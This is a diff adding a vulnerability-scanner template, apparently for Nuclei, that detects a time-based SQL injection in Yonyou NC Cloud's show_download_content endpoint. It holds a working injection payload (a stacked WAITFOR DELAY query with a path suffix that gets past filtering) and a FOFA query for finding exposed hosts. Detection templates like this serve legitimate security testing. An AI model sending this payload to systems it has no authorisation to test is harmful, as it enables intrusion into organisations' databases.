@@ -1,0 +1,34 @@
+id: yonyou-nc-cloud-show_download_content-sqli
+info:
+  name: 用友 NC Cloud show_download_content - sqli
+  author: leadlife
+  severity: high
+  description: 用友NC-Cloud系统show_download_content接口存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BNC-Cloud%E7%B3%BB%E7%BB%9Fshow_download_content%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: app="用友-NC-Cloud"
+  tags: 2024,sqli,yonyou,nccloud,time,oa
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Accept-Language: zh-CN
+        Connection: keep-alive
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'Yonyou')
+          - status_code == 500
+          - duration >= 5 && duration < 9
+        condition: and
